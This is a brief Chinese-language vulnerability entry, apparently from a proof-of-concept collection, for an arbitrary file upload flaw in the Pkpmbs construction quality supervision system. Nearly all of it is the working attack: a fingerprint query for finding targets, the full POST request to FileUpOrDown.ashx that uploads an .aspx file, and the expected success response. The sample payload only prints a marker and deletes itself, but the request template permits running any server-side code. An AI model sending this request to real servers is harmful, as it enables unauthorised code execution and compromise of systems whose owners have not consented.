# Pkpmbs建设工程质量监督系统FileUpOrDown.ashx文件上传漏洞

- **系统**：Pkpmbs　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Content/Theme/Standard/"`
- **请求**：`POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName=5B56bf.aspx HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----FhjdfkjfbgjhfgbjhfhgHGUHYG…`

**请求体 / payload**
```
------FhjdfkjfbgjhfgbjhfhgHGUHYGUYGBG
Content-Disposition: form-data; name="Filedata"; filename="dudesuite.aspx"
Content-Type: image/png
<%@ Page Language="C#" %>
<%
Response.Write("DudeSuite!");
System.IO.File.Delete(Request.ServerVariables["PATH_TRANSLATED"]);
%>
------FhjdfkjfbgjhfgbjhfhgHGUHYGUYGBG--
```
- **预期**：200　|　'1\|(/\w*/\w*/\w*)'